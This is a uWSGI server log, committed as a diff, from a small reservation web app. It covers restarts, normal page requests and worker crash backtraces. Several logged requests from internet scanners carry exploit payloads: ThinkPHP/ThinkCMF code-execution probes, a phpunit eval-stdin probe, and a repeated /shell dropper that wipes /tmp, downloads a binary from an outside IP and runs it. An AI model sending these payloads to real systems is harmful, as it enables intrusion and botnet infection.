@@ -1,0 +1,810 @@
+*** Starting uWSGI 2.0.19.1 (64bit) on [Wed Jul  8 19:44:07 2020] ***
+compiled with version: 7.4.0 on 08 July 2020 11:20:11
+os: Linux-4.15.0-54-generic #58-Ubuntu SMP Mon Jun 24 10:55:24 UTC 2019
+nodename: VM-0-3-ubuntu
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /home/ubuntu/DietSystem/ReservationSystem/visible
+writing pidfile to uwsgi.pid
+detected binary path: /home/ubuntu/.local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+your processes number limit is 7080
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+probably another instance of uWSGI is running on the same address (172.17.0.3:5000).
+bind(): Address already in use [core/socket.c line 769]
+*** Starting uWSGI 2.0.19.1 (64bit) on [Wed Jul  8 20:48:22 2020] ***
+compiled with version: 7.4.0 on 08 July 2020 11:20:11
+os: Linux-4.15.0-54-generic #58-Ubuntu SMP Mon Jun 24 10:55:24 UTC 2019
+nodename: VM-0-3-ubuntu
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /home/ubuntu/DietSystem/ReservationSystem/visible
+writing pidfile to uwsgi.pid
+detected binary path: /home/ubuntu/.local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+your processes number limit is 7080
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+probably another instance of uWSGI is running on the same address (172.17.0.3:5000).
+bind(): Address already in use [core/socket.c line 769]
+*** Starting uWSGI 2.0.19.1 (64bit) on [Wed Jul  8 20:51:08 2020] ***
+compiled with version: 7.4.0 on 08 July 2020 11:20:11
+os: Linux-4.15.0-54-generic #58-Ubuntu SMP Mon Jun 24 10:55:24 UTC 2019
+nodename: VM-0-3-ubuntu
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /home/ubuntu/DietSystem/ReservationSystem/visible
+writing pidfile to uwsgi.pid
+detected binary path: /home/ubuntu/.local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+your processes number limit is 7080
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address 172.17.0.3:5000 fd 3
+Python version: 3.6.9 (default, Nov  7 2019, 10:44:02)  [GCC 8.3.0]
+Python main interpreter initialized at 0x556c497df330
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416720 bytes (406 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 22202)
+spawned uWSGI worker 1 (pid: 22203, cores: 2)
+spawned uWSGI worker 2 (pid: 22204, cores: 2)
+spawned uWSGI worker 3 (pid: 22205, cores: 2)
+spawned uWSGI worker 4 (pid: 22206, cores: 2)
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x556c497df330 pid: 22203 (default app)
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x556c497df330 pid: 22206 (default app)
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x556c497df330 pid: 22205 (default app)
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x556c497df330 pid: 22204 (default app)
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+[pid: 22203|app: 0|req: 1/1] 223.104.63.195 () {40 vars in 732 bytes} [Wed Jul  8 20:51:43 2020] GET /reserve_user => generated 14621 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 6 headers in 245 bytes (0 switches on core 0)
+[pid: 22204|app: 0|req: 1/2] 223.104.63.195 () {46 vars in 873 bytes} [Wed Jul  8 20:53:50 2020] GET /reserve_user => generated 14621 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 6 headers in 245 bytes (0 switches on core 0)
+SIGINT/SIGQUIT received...killing workers...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+goodbye to uWSGI.
+*** Starting uWSGI 2.0.19.1 (64bit) on [Wed Jul  8 20:54:32 2020] ***
+compiled with version: 7.4.0 on 08 July 2020 11:20:11
+os: Linux-4.15.0-54-generic #58-Ubuntu SMP Mon Jun 24 10:55:24 UTC 2019
+nodename: VM-0-3-ubuntu
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /home/ubuntu/DietSystem/ReservationSystem/visible
+writing pidfile to uwsgi.pid
+detected binary path: /home/ubuntu/.local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+your processes number limit is 7080
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address 172.17.0.3:5000 fd 3
+Python version: 3.6.9 (default, Nov  7 2019, 10:44:02)  [GCC 8.3.0]
+Python main interpreter initialized at 0x55b55bbd0340
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416720 bytes (406 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 22755)
+spawned uWSGI worker 1 (pid: 22756, cores: 2)
+spawned uWSGI worker 2 (pid: 22757, cores: 2)
+spawned uWSGI worker 3 (pid: 22758, cores: 2)
+spawned uWSGI worker 4 (pid: 22759, cores: 2)
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x55b55bbd0340 pid: 22758 (default app)
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x55b55bbd0340 pid: 22757 (default app)
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x55b55bbd0340 pid: 22756 (default app)
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x55b55bbd0340 pid: 22759 (default app)
+[pid: 22759|app: 0|req: 1/1] 223.104.63.195 () {46 vars in 873 bytes} [Wed Jul  8 20:54:37 2020] GET /reserve_user => generated 14621 bytes in 2 msecs via sendfile() (HTTP/1.1 200) 6 headers in 245 bytes (0 switches on core 0)
+[pid: 22758|app: 0|req: 1/2] 223.104.63.195 () {44 vars in 785 bytes} [Wed Jul  8 20:54:49 2020] GET /reserve_user => generated 14621 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 6 headers in 245 bytes (0 switches on core 0)
+[pid: 22759|app: 0|req: 2/3] 223.104.63.195 () {44 vars in 785 bytes} [Wed Jul  8 20:55:47 2020] GET /reserve_user => generated 14621 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 6 headers in 245 bytes (0 switches on core 1)
+[pid: 22759|app: 0|req: 3/4] 223.104.63.195 () {44 vars in 785 bytes} [Wed Jul  8 20:56:16 2020] GET /reserve_user => generated 14621 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 6 headers in 245 bytes (0 switches on core 1)
+[pid: 22759|app: 0|req: 4/5] 195.54.160.135 () {34 vars in 536 bytes} [Wed Jul  8 21:08:47 2020] GET /solr/admin/info/system?wt=json => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 22759|app: 0|req: 5/6] 195.54.160.135 () {34 vars in 536 bytes} [Wed Jul  8 21:14:37 2020] GET /?XDEBUG_SESSION_START=phpstorm => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 22759|app: 0|req: 6/7] 195.54.160.135 () {36 vars in 633 bytes} [Wed Jul  8 21:19:38 2020] GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 22759|app: 0|req: 7/8] 195.54.160.135 () {34 vars in 696 bytes} [Wed Jul  8 21:21:45 2020] GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 22759|app: 0|req: 8/9] 195.54.160.135 () {38 vars in 590 bytes} [Wed Jul  8 23:00:39 2020] POST /api/jsonws/invoke => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 22759|app: 0|req: 9/10] 192.241.226.189 () {34 vars in 387 bytes} [Wed Jul  8 23:27:35 2020] GET /hudson => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 22759|app: 0|req: 10/11] 139.199.172.82 () {34 vars in 481 bytes} [Wed Jul  8 23:54:57 2020] GET /TP/public/index.php => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 22758|app: 0|req: 2/12] 139.199.172.82 () {34 vars in 467 bytes} [Wed Jul  8 23:54:57 2020] GET /TP/index.php => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 22757|app: 0|req: 1/13] 139.199.172.82 () {34 vars in 503 bytes} [Wed Jul  8 23:54:57 2020] GET /thinkphp/html/public/index.php => generated 232 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 22756|app: 0|req: 1/14] 139.199.172.82 () {34 vars in 485 bytes} [Wed Jul  8 23:54:57 2020] GET /html/public/index.php => generated 232 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 22759|app: 0|req: 11/15] 139.199.172.82 () {34 vars in 475 bytes} [Wed Jul  8 23:54:57 2020] GET /public/index.php => generated 232 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 22759|app: 0|req: 12/16] 139.199.172.82 () {34 vars in 491 bytes} [Wed Jul  8 23:54:57 2020] GET /TP/html/public/index.php => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 22759|app: 0|req: 13/17] 139.199.172.82 () {34 vars in 463 bytes} [Wed Jul  8 23:54:57 2020] GET /elrekt.php => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 22758|app: 0|req: 3/18] 139.199.172.82 () {34 vars in 461 bytes} [Wed Jul  8 23:54:57 2020] GET /index.php => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 22758|app: 0|req: 4/19] 139.199.172.82 () {34 vars in 446 bytes} [Wed Jul  8 23:54:57 2020] GET / => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 22759|app: 0|req: 14/20] 80.82.70.140 () {42 vars in 656 bytes} [Thu Jul  9 00:57:05 2020] GET / => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 22759|app: 0|req: 15/21] 124.235.138.131 () {44 vars in 751 bytes} [Thu Jul  9 02:01:10 2020] HEAD / => generated 0 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (0 switches on core 0)
+[pid: 22759|app: 0|req: 16/22] 117.81.13.30 () {32 vars in 466 bytes} [Thu Jul  9 02:13:16 2020] GET /phpmyadmin/ => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 22759|app: 0|req: 17/23] 80.82.70.187 () {32 vars in 413 bytes} [Thu Jul  9 02:29:28 2020] GET /cache/global/img/gs.gif => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 22759|app: 0|req: 18/24] 102.41.208.94 () {34 vars in 680 bytes} [Thu Jul  9 02:51:24 2020] GET /shell?cd+/tmp;rm+-rf+*;wget+95.213.165.45/beastmode/b3astmode;chmod+777+/tmp/b3astmode;sh+/tmp/b3astmode+BeastMode.Rep.Jaws => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 22757|app: 0|req: 2/25] 102.41.208.94 () {34 vars in 680 bytes} [Thu Jul  9 02:51:28 2020] GET /shell?cd+/tmp;rm+-rf+*;wget+95.213.165.45/beastmode/b3astmode;chmod+777+/tmp/b3astmode;sh+/tmp/b3astmode+BeastMode.Rep.Jaws => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 22759|app: 0|req: 19/26] 195.54.160.135 () {36 vars in 604 bytes} [Thu Jul  9 03:02:39 2020] GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 22759|app: 0|req: 20/27] 192.241.220.39 () {34 vars in 374 bytes} [Thu Jul  9 03:30:12 2020] GET / => generated 232 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 22759|app: 0|req: 21/28] 195.54.160.135 () {38 vars in 692 bytes} [Thu Jul  9 03:46:46 2020] POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 22759|app: 0|req: 22/29] 102.46.139.136 () {34 vars in 681 bytes} [Thu Jul  9 03:59:31 2020] GET /shell?cd+/tmp;rm+-rf+*;wget+95.213.165.45/beastmode/b3astmode;chmod+777+/tmp/b3astmode;sh+/tmp/b3astmode+BeastMode.Rep.Jaws => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 22759|app: 0|req: 23/30] 80.82.70.140 () {42 vars in 656 bytes} [Thu Jul  9 04:29:46 2020] GET / => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 22759|app: 0|req: 24/31] 103.215.200.60 () {32 vars in 451 bytes} [Thu Jul  9 06:43:25 2020] GET / => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 22759|app: 0|req: 25/32] 189.78.158.159 () {32 vars in 445 bytes} [Thu Jul  9 07:07:18 2020] GET / => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 22759|app: 0|req: 26/33] 37.49.230.133 () {42 vars in 657 bytes} [Thu Jul  9 07:45:07 2020] GET / => generated 232 bytes in 2 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 22759|app: 0|req: 27/34] 80.82.70.140 () {42 vars in 656 bytes} [Thu Jul  9 07:52:44 2020] GET / => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 22759|app: 0|req: 28/35] 93.210.206.250 () {32 vars in 468 bytes} [Thu Jul  9 08:17:40 2020] GET /phpmyadmin/ => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 22759|app: 0|req: 29/36] 182.254.52.17 () {36 vars in 546 bytes} [Thu Jul  9 09:07:41 2020] GET /manager/html => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 22759|app: 0|req: 30/37] 182.254.52.17 () {36 vars in 522 bytes} [Thu Jul  9 09:15:00 2020] GET / => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 22759|app: 0|req: 31/38] 138.255.15.34 () {32 vars in 444 bytes} [Thu Jul  9 09:53:42 2020] GET / => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 22759|app: 0|req: 32/39] 122.51.89.38 () {32 vars in 328 bytes} [Thu Jul  9 10:17:59 2020] GET / => generated 232 bytes in 1 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21584 (max 4096)...skip
+invalid request block size: 21584 (max 4096)...skip
+-- unavailable modifier requested: 128 --
+invalid request block size: 7678 (max 4096)...skip
+[pid: 22758|app: 0|req: 5/41] 167.172.64.185 () {26 vars in 262 bytes} [Thu Jul  9 10:34:33 2020] GET / => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 22757|app: 0|req: 3/42] 167.172.64.185 () {32 vars in 449 bytes} [Thu Jul  9 10:34:34 2020] GET / => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 22759|app: 0|req: 33/43] 167.172.64.185 () {32 vars in 449 bytes} [Thu Jul  9 10:34:35 2020] GET / => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 22756|app: 0|req: 2/44] 167.172.64.185 () {32 vars in 455 bytes} [Thu Jul  9 10:34:36 2020] GET /web => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 22757|app: 0|req: 4/45] 167.172.64.185 () {32 vars in 457 bytes} [Thu Jul  9 10:34:47 2020] GET /mail => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+invalid request block size: 27749 (max 4096)...skip
+invalid request block size: 19528 (max 4096)...skip
+invalid request block size: 19525 (max 4096)...skip
+-- unavailable modifier requested: 22 --
+-- unavailable modifier requested: 3 --
+-- unavailable modifier requested: 22 --
+Empty python request. skip.
+[pid: 22759|app: -1|req: -1/49]  () {0 vars in 0 bytes} [Thu Jul  9 10:35:09 2020]   => generated 0 bytes in 0 msecs ( 0) 0 headers in 0 bytes (0 switches on core 1)
+Empty python request. skip.
+[pid: 22756|app: -1|req: -1/50]  () {0 vars in 0 bytes} [Thu Jul  9 10:35:11 2020]   => generated 0 bytes in 0 msecs ( 0) 0 headers in 0 bytes (0 switches on core 1)
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 25956 (max 4096)...skip
+invalid request block size: 21584 (max 4096)...skip
+invalid request block size: 21584 (max 4096)...skip
+invalid request block size: 19790 (max 4096)...skip
+-- unavailable modifier requested: 3 --
+invalid request block size: 25709 (max 4096)...skip
+[pid: 22759|app: 0|req: 34/52] 103.73.182.222 () {32 vars in 445 bytes} [Thu Jul  9 10:37:10 2020] GET / => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 22759|app: 0|req: 35/53] 182.254.52.17 () {36 vars in 496 bytes} [Thu Jul  9 10:57:13 2020] GET /portal/redlion => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 22759|app: 0|req: 36/54] 223.104.63.195 () {44 vars in 842 bytes} [Thu Jul  9 12:07:34 2020] GET /reserve_user => generated 14621 bytes in 2 msecs via sendfile() (HTTP/1.1 200) 6 headers in 245 bytes (0 switches on core 0)
+[pid: 22759|app: 0|req: 37/55] 193.118.53.210 () {34 vars in 468 bytes} [Thu Jul  9 12:08:38 2020] GET / => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 22759|app: 0|req: 38/56] 80.82.70.187 () {32 vars in 413 bytes} [Thu Jul  9 12:10:05 2020] GET /cache/global/img/gs.gif => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 22759|app: 0|req: 39/57] 47.94.165.147 () {34 vars in 480 bytes} [Thu Jul  9 12:37:46 2020] GET /TP/public/index.php => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 22759|app: 0|req: 40/58] 188.158.93.57 () {36 vars in 499 bytes} [Thu Jul  9 12:49:54 2020] GET / => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 22759|app: 0|req: 41/59] 192.241.214.40 () {34 vars in 402 bytes} [Thu Jul  9 13:33:21 2020] GET /portal/redlion => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 22759|app: 0|req: 42/60] 89.248.172.16 () {34 vars in 516 bytes} [Thu Jul  9 13:55:34 2020] GET / => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 22756|app: 0|req: 3/61] 89.248.172.16 () {30 vars in 339 bytes} [Thu Jul  9 13:55:35 2020] GET /robots.txt => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 22756|app: 0|req: 4/62] 89.248.172.16 () {30 vars in 341 bytes} [Thu Jul  9 13:55:38 2020] GET /sitemap.xml => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 22757|app: 0|req: 5/63] 89.248.172.16 () {30 vars in 367 bytes} [Thu Jul  9 13:55:40 2020] GET /.well-known/security.txt => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 22758|app: 0|req: 6/64] 89.248.172.16 () {36 vars in 434 bytes} [Thu Jul  9 13:55:43 2020] GET /favicon.ico => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 22759|app: 0|req: 43/65] 36.66.178.81 () {32 vars in 443 bytes} [Thu Jul  9 14:08:11 2020] GET / => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 22759|app: 0|req: 44/66] 201.182.145.213 () {38 vars in 511 bytes} [Thu Jul  9 14:24:51 2020] GET / => generated 232 bytes in 1 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 22759|app: 0|req: 45/67] 195.54.160.135 () {34 vars in 536 bytes} [Thu Jul  9 14:33:25 2020] GET /solr/admin/info/system?wt=json => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 22759|app: 0|req: 46/68] 195.54.160.135 () {34 vars in 536 bytes} [Thu Jul  9 14:48:23 2020] GET /?XDEBUG_SESSION_START=phpstorm => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 22759|app: 0|req: 47/69] 223.104.63.195 () {44 vars in 785 bytes} [Thu Jul  9 14:57:09 2020] GET /reserve_user => generated 14621 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 6 headers in 245 bytes (0 switches on core 0)
+[pid: 22759|app: 0|req: 48/70] 223.104.63.195 () {44 vars in 785 bytes} [Thu Jul  9 15:00:41 2020] GET /reserve_user => generated 14621 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 6 headers in 245 bytes (0 switches on core 0)
+[pid: 22758|app: 0|req: 7/71] 223.104.63.195 () {46 vars in 808 bytes} [Thu Jul  9 15:00:44 2020] GET /:8000/v1/messages/customer_get_green => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 22759|app: 0|req: 49/72] 195.54.160.135 () {36 vars in 633 bytes} [Thu Jul  9 15:01:30 2020] GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 22759|app: 0|req: 50/73] 223.104.63.195 () {44 vars in 785 bytes} [Thu Jul  9 15:01:32 2020] GET /reserve_user => generated 14621 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 6 headers in 245 bytes (0 switches on core 0)
+[pid: 22759|app: 0|req: 51/74] 223.104.63.195 () {46 vars in 808 bytes} [Thu Jul  9 15:01:35 2020] GET /:8000/v1/messages/customer_get_green => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 22759|app: 0|req: 52/75] 223.104.63.195 () {44 vars in 785 bytes} [Thu Jul  9 15:02:42 2020] GET /reserve_user => generated 14621 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 6 headers in 245 bytes (0 switches on core 0)
+[pid: 22759|app: 0|req: 53/76] 223.104.63.195 () {44 vars in 785 bytes} [Thu Jul  9 15:03:53 2020] GET /reserve_user => generated 14621 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 6 headers in 245 bytes (0 switches on core 1)
+[pid: 22759|app: 0|req: 54/77] 223.104.63.195 () {44 vars in 785 bytes} [Thu Jul  9 15:04:08 2020] GET /reserve_user => generated 14621 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 6 headers in 245 bytes (0 switches on core 0)
+[pid: 22759|app: 0|req: 55/78] 195.54.160.135 () {34 vars in 696 bytes} [Thu Jul  9 15:05:47 2020] GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 22759|app: 0|req: 56/79] 223.104.63.195 () {44 vars in 785 bytes} [Thu Jul  9 15:14:44 2020] GET /reserve_user => generated 14621 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 6 headers in 245 bytes (0 switches on core 1)
+...brutally killing workers...
+!!! uWSGI process 22756 got Segmentation Fault !!!
+!!! uWSGI process 22759 got Segmentation Fault !!!
+!!! uWSGI process 22757 got Segmentation Fault !!!
+!!! uWSGI process 22758 got Segmentation Fault !!!
+*** backtrace of 22758 ***
+uwsgi(uwsgi_backtrace+0x2a) [0x55b559af5aba]
+uwsgi(uwsgi_segfault+0x23) [0x55b559af5ea3]
+/lib/x86_64-linux-gnu/libc.so.6(+0x3ef20) [0x7f472887ff20]
+/usr/lib/x86_64-linux-gnu/libpython3.6m.so.1.0(+0x131ea4) [0x7f4728d63ea4]
+/usr/lib/x86_64-linux-gnu/libpython3.6m.so.1.0(+0x2198ae) [0x7f4728e4b8ae]
+/usr/lib/x86_64-linux-gnu/libpython3.6m.so.1.0(+0x135375) [0x7f4728d67375]
+/usr/lib/x86_64-linux-gnu/libpython3.6m.so.1.0(PyGC_Collect+0x5d) [0x7f4728d6832d]
+/usr/lib/x86_64-linux-gnu/libpython3.6m.so.1.0(Py_FinalizeEx+0x73) [0x7f4728d909c3]
+uwsgi(uwsgi_plugins_atexit+0x81) [0x55b559af3fc1]
+/lib/x86_64-linux-gnu/libc.so.6(+0x43041) [0x7f4728884041]
+/lib/x86_64-linux-gnu/libc.so.6(+0x4313a) [0x7f472888413a]
+uwsgi(+0x37f9f) [0x55b559aaaf9f]
+uwsgi(end_me+0x25) [0x55b559af2c25]
+/lib/x86_64-linux-gnu/libpthread.so.0(+0x12890) [0x7f4729ac3890]
+/lib/x86_64-linux-gnu/libc.so.6(epoll_wait+0x57) [0x7f4728962bb7]
+uwsgi(event_queue_wait+0x34) [0x55b559ae9224]
+uwsgi(wsgi_req_accept+0x13a) [0x55b559aa853a]
+uwsgi(simple_loop_run+0xb6) [0x55b559af1b36]
+uwsgi(simple_loop+0x10) [0x55b559af1940]
+uwsgi(uwsgi_ignition+0x2ab) [0x55b559af620b]
+uwsgi(uwsgi_worker_run+0x26e) [0x55b559afa8be]
+uwsgi(+0x87e84) [0x55b559afae84]
+uwsgi(+0x348ee) [0x55b559aa78ee]
+/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xe7) [0x7f4728862b97]
+uwsgi(_start+0x2a) [0x55b559aa791a]
+*** end of backtrace ***
+*** backtrace of 22756 ***
+uwsgi(uwsgi_backtrace+0x2a) [0x55b559af5aba]
+uwsgi(uwsgi_segfault+0x23) [0x55b559af5ea3]
+/lib/x86_64-linux-gnu/libc.so.6(+0x3ef20) [0x7f472887ff20]
+/usr/lib/x86_64-linux-gnu/libpython3.6m.so.1.0(+0x131ea4) [0x7f4728d63ea4]
+/usr/lib/x86_64-linux-gnu/libpython3.6m.so.1.0(+0x2198ae) [0x7f4728e4b8ae]
+/usr/lib/x86_64-linux-gnu/libpython3.6m.so.1.0(+0x135375) [0x7f4728d67375]
+/usr/lib/x86_64-linux-gnu/libpython3.6m.so.1.0(PyGC_Collect+0x5d) [0x7f4728d6832d]
+/usr/lib/x86_64-linux-gnu/libpython3.6m.so.1.0(Py_FinalizeEx+0x73) [0x7f4728d909c3]
+uwsgi(uwsgi_plugins_atexit+0x81) [0x55b559af3fc1]
+/lib/x86_64-linux-gnu/libc.so.6(+0x43041) [0x7f4728884041]
+/lib/x86_64-linux-gnu/libc.so.6(+0x4313a) [0x7f472888413a]
+uwsgi(+0x37f9f) [0x55b559aaaf9f]
+uwsgi(end_me+0x25) [0x55b559af2c25]
+/lib/x86_64-linux-gnu/libpthread.so.0(+0x12890) [0x7f4729ac3890]
+/lib/x86_64-linux-gnu/libc.so.6(epoll_wait+0x57) [0x7f4728962bb7]
+uwsgi(event_queue_wait+0x34) [0x55b559ae9224]
+uwsgi(wsgi_req_accept+0x13a) [0x55b559aa853a]
